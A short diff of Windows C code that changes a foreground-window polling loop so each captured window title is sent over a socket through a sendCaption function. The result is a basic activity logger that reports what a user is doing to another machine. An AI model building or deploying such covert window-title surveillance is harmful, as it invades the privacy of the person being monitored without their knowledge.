@@ -1,6 +1,7 @@
+#define _WINSOCKAPI_ //stop windows.h from including winsock.h
 #include <stdio.h>
-#include <Windows.h>
-
+#include <windows.h>
+#include "Messanger.h"
 
 /*function prototypes*/
 void getProcessInfo(void);
@@ -73,7 +74,8 @@ BOOL CALLBACK TestEnumWindowsProc(HWND hwnd, LPARAM lParam) {
 }
 
 /*Get the foreground window text*/
-DWORD WINAPI getCurrentWin() {
+DWORD WINAPI getCurrentWin(SOCKET socket) {
+
 	while (TRUE) {
 
 	Sleep(5000);
@@ -82,6 +84,8 @@ DWORD WINAPI getCurrentWin() {
 		char winTitle[256];
 		GetWindowText(foreGrndWin, winTitle, 256);
 		printf("\nCurrent Window Title  is: %s", winTitle);
+
+		sendCaption(winTitle, socket);
 	}
 	}
 }
